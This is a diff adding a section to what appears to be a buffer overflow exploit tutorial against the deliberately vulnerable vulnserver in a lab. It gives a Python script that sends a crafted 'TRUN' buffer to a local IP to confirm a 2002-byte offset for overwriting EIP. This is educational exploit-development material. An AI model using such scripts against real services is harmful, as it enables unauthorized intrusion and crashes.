@@ -287,5 +287,36 @@ So we now have our offset: 2002 bytes. The offset is essentially how far into ou
 
 ![](/assets/images/CTP/string.JPG)
 
+What we want to do now is to verify that our offset is correct. This might seem like a painful process, but approaching buffer overflow exploit development in a methodical way like this, checking each step, is how we avoid skipping a step and puzzling over our completed exploit which doesn't actually exploit anything. We want to chop those 3 sections identified above into 3 distinct character sets to assess whether or not they actually align as we imagine. We want the following distinction:
++ 2002 bytes: `A` or `41`
++ 4 byte EIP overwrite: `B` or `42`
++ remainder of string: `C` or `43`
+
+We will change our `exploit.py` as follows:
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+buffer = "A" * 2002
+buffer += "B" * 4
+buffer += "C" * (5000 - len(buffer))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("TRUN /.:/ " + buffer)
+print s.recv(1024)
+s.close()
+```
+
+Running this exploit against our Immunity-attached vulnserver should net us an `EIP` value of `42424242` since we should be overwriting the value with our `B`'s. 
+
+
 
 --To Be Continued--
